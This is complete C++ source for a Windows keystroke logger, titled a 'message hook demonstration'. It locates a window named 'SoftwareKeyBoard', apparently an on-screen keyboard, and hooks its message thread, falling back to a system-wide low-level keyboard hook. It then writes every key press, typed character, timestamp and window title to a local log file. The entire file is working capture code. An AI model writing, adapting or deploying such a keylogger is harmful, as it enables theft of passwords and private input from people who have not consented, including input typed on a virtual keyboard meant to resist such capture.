#include <iostream>
#include <fstream>
#include <string>
#include <windows.h>
#include <chrono>
#include <ctime>

// Global file for logging captured keystrokes
std::ofstream logFile;

// Hook handle
HHOOK messageHook;
HWND targetWindow = NULL;

// Convert virtual key code to string representation
std::string getKeyName(DWORD vkCode) {
    char keyName[256] = {0};
    DWORD scanCode = MapVirtualKey(vkCode, MAPVK_VK_TO_VSC);
    
    // Handle special keys
    switch (vkCode) {
        case VK_RETURN:
            return "Enter";
        case VK_ESCAPE:
            return "Escape";
        case VK_BACK:
            return "Backspace";
        case VK_TAB:
            return "Tab";
        case VK_SPACE:
            return "Space";
        case VK_SHIFT:
        case VK_LSHIFT:
        case VK_RSHIFT:
            return "Shift";
        case VK_CONTROL:
        case VK_LCONTROL:
        case VK_RCONTROL:
            return "Control";
        case VK_MENU:
        case VK_LMENU:
        case VK_RMENU:
            return "Alt";
        // Add more special keys as needed
        default:
            // For standard keys, get the key name from the system
            GetKeyNameTextA(scanCode << 16, keyName, sizeof(keyName));
            if (strlen(keyName) > 0) {
                return keyName;
            }
            // For other keys just return the virtual key code
            return "Key(" + std::to_string(vkCode) + ")";
    }
}

std::string getCurrentTimestamp() {
    auto now = std::chrono::system_clock::now();
    std::time_t time = std::chrono::system_clock::to_time_t(now);
    
    std::string timeStr = std::ctime(&time);
    // Remove newline
    if (!timeStr.empty() && timeStr[timeStr.length() - 1] == '\n') {
        timeStr.erase(timeStr.length() - 1);
    }
    
    return timeStr;
}

// Callback function for window enumeration
BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    char windowText[256];
    GetWindowTextA(hwnd, windowText, sizeof(windowText));
    
    // Find the SoftwareKeyBoard window
    if (strstr(windowText, "SoftwareKeyBoard") != NULL) {
        targetWindow = hwnd;
        std::cout << "Found SoftwareKeyBoard window: " << windowText << " (HWND: " << hwnd << ")" << std::endl;
        if (logFile.is_open()) {
            logFile << getCurrentTimestamp() << " - Found SoftwareKeyBoard window: " 
                   << windowText << " (HWND: " << hwnd << ")" << std::endl;
        }
        
        // Stop enumeration as we found our target
        return FALSE;
    }
    
    return TRUE; // Continue enumeration
}

// Callback function that processes window messages
LRESULT CALLBACK MessageProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // If nCode is less than zero, pass to next hook
    if (nCode < 0) {
        return CallNextHookEx(messageHook, nCode, wParam, lParam);
    }
    
    // Process window messages for WH_CALLWNDPROC hook
    if (nCode == HC_ACTION) {
        CWPSTRUCT* cwp = (CWPSTRUCT*)lParam;
        
        // Check if the message is for our target window
        if (cwp->hwnd == targetWindow || GetParent(cwp->hwnd) == targetWindow) {
            // Log WM_CHAR messages which represent character input
            if (cwp->message == WM_CHAR) {
                char c = (char)cwp->wParam;
                std::string displayChar = isprint(c) ? std::string(1, c) : "ASCII(" + std::to_string((int)c) + ")";
                
                HWND foregroundWindow = GetForegroundWindow();
                char windowTitle[256] = {0};
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                // Log the key event
                if (logFile.is_open()) {
                    logFile << getCurrentTimestamp() << " - " 
                            << "WM_CHAR: " << displayChar << " | "
                            << "Window: " << windowTitle << std::endl;
                }
                
                // Print to console as well
                std::cout << "WM_CHAR: " << displayChar << " (Window: " << windowTitle << ")" << std::endl;
            }
            // Also log keydown/keyup messages
            else if (cwp->message == WM_KEYDOWN || cwp->message == WM_SYSKEYDOWN) {
                DWORD vkCode = (DWORD)cwp->wParam;
                std::string keyName = getKeyName(vkCode);
                
                HWND foregroundWindow = GetForegroundWindow();
                char windowTitle[256] = {0};
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                // Log the key event
                if (logFile.is_open()) {
                    logFile << getCurrentTimestamp() << " - " 
                            << "KeyDown: " << keyName << " | "
                            << "Window: " << windowTitle << " | "
                            << "VK Code: " << vkCode << std::endl;
                }
                
                // Print to console as well
                std::cout << "KeyDown: " << keyName << " (Window: " << windowTitle << ")" << std::endl;
            }
            else if (cwp->message == WM_KEYUP || cwp->message == WM_SYSKEYUP) {
                DWORD vkCode = (DWORD)cwp->wParam;
                std::string keyName = getKeyName(vkCode);
                
                HWND foregroundWindow = GetForegroundWindow();
                char windowTitle[256] = {0};
                GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
                
                // Log the key event
                if (logFile.is_open()) {
                    logFile << getCurrentTimestamp() << " - " 
                            << "KeyUp: " << keyName << " | "
                            << "Window: " << windowTitle << " | "
                            << "VK Code: " << vkCode << std::endl;
                }
                
                // Print to console as well
                std::cout << "KeyUp: " << keyName << " (Window: " << windowTitle << ")" << std::endl;
            }
            
            // Log all messages for debugging
            if (logFile.is_open()) {
                logFile << getCurrentTimestamp() << " - " 
                        << "Message: 0x" << std::hex << cwp->message << std::dec << " | "
                        << "wParam: " << cwp->wParam << " | "
                        << "lParam: " << cwp->lParam << std::endl;
            }
        }
    }
    
    // Pass to next hook
    return CallNextHookEx(messageHook, nCode, wParam, lParam);
}

// Callback function for system-wide keyboard hook
LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // If nCode is less than zero, pass to next hook
    if (nCode < 0) {
        return CallNextHookEx(messageHook, nCode, wParam, lParam);
    }
    
    // Process keyboard events
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbdStruct = (KBDLLHOOKSTRUCT*)lParam;
        
        // Only process keyboard events when our window is in focus
        HWND foregroundWindow = GetForegroundWindow();
        if (foregroundWindow == targetWindow || GetParent(foregroundWindow) == targetWindow) {
            std::string eventType;
            if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
                eventType = "Key Down";
            } else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
                eventType = "Key Up";
            } else {
                eventType = "Other";
            }
            
            // Get name of the key
            std::string keyName = getKeyName(kbdStruct->vkCode);
            
            // Get window title
            char windowTitle[256] = {0};
            GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
            
            // Log the key event
            if (logFile.is_open()) {
                logFile << getCurrentTimestamp() << " - " 
                        << "Event: " << eventType << " | "
                        << "Key: " << keyName << " | "
                        << "Window: " << windowTitle << " | "
                        << "VK Code: " << kbdStruct->vkCode << " | "
                        << "Scan Code: " << kbdStruct->scanCode << std::endl;
            }
            
            // Print to console as well
            std::cout << eventType << ": " << keyName << " (Window: " << windowTitle << ")" << std::endl;
        }
    }
    
    // Pass to next hook
    return CallNextHookEx(messageHook, nCode, wParam, lParam);
}

int main() {
    std::cout << "Message Hook Demonstration - Captures events from SoftwareKeyBoard" << std::endl;
    std::cout << "==================================================================" << std::endl;
    
    // Open log file
    logFile.open("keyboard_hook_log.txt", std::ios::out | std::ios::app);
    if (!logFile.is_open()) {
        std::cerr << "Failed to open log file!" << std::endl;
        return 1;
    }
    
    logFile << "\n\n" << getCurrentTimestamp() << " - Message hook started" << std::endl;
    
    // Find the SoftwareKeyBoard window
    std::cout << "Looking for SoftwareKeyBoard window..." << std::endl;
    EnumWindows(EnumWindowsProc, 0);
    
    if (targetWindow == NULL) {
        std::cerr << "SoftwareKeyBoard window not found! Make sure it's running." << std::endl;
        logFile << getCurrentTimestamp() << " - SoftwareKeyBoard window not found!" << std::endl;
        logFile.close();
        return 1;
    }
    
    // Get the thread ID properly
    DWORD processId;
    DWORD threadId = GetWindowThreadProcessId(targetWindow, &processId);
    
    if (threadId == 0) {
        std::cerr << "Failed to get thread ID for the target window!" << std::endl;
        logFile << getCurrentTimestamp() << " - Failed to get thread ID. Error code: " 
                << GetLastError() << std::endl;
        logFile.close();
        return 1;
    }
    
    // Log the process and thread IDs for debugging
    std::cout << "Target window process ID: " << processId << ", thread ID: " << threadId << std::endl;
    logFile << getCurrentTimestamp() << " - Target process ID: " << processId 
            << ", thread ID: " << threadId << std::endl;
    
    // Try different hook types in sequence if previous ones fail
    
    // First try: WH_CALLWNDPROC
    messageHook = SetWindowsHookEx(WH_CALLWNDPROC, MessageProc, NULL, threadId);
    
    if (messageHook == NULL) {
        DWORD error = GetLastError();
        std::cerr << "Failed to install WH_CALLWNDPROC hook. Trying WH_KEYBOARD_LL..." << std::endl;
        logFile << getCurrentTimestamp() << " - Failed to install WH_CALLWNDPROC hook. Error code: " 
                << error << ". Trying WH_KEYBOARD_LL..." << std::endl;
        
        // Second try: WH_KEYBOARD_LL (system-wide low-level keyboard hook)
        messageHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProc, NULL, 0);
        
        if (messageHook == NULL) {
            error = GetLastError();
            std::cerr << "Failed to install keyboard hook! Error code: " << error << std::endl;
            
            // Additional error information
            char* errorMsg = NULL;
            FormatMessageA(
                FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
                NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                (LPSTR)&errorMsg, 0, NULL);
                
            if (errorMsg) {
                std::cerr << "Error description: " << errorMsg << std::endl;
                logFile << getCurrentTimestamp() << " - Failed to install keyboard hook. Error: " 
                        << errorMsg << " (Code: " << error << ")" << std::endl;
                LocalFree(errorMsg);
            } else {
                logFile << getCurrentTimestamp() << " - Failed to install keyboard hook. Error code: " 
                        << error << std::endl;
            }
            
            logFile.close();
            return 1;
        } else {
            std::cout << "WH_KEYBOARD_LL hook installed successfully." << std::endl;
            logFile << getCurrentTimestamp() << " - WH_KEYBOARD_LL hook installed successfully." << std::endl;
        }
    } else {
        std::cout << "WH_CALLWNDPROC hook installed successfully." << std::endl;
        logFile << getCurrentTimestamp() << " - WH_CALLWNDPROC hook installed successfully." << std::endl;
    }
    
    std::cout << "Listening for messages from SoftwareKeyBoard..." << std::endl;
    std::cout << "Press Ctrl+C to exit" << std::endl;
    
    // Message loop to keep application running and processing keyboard events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    // Clean up
    UnhookWindowsHookEx(messageHook);
    logFile << getCurrentTimestamp() << " - Message hook stopped" << std::endl;
    logFile.close();
    
    return 0;
} 
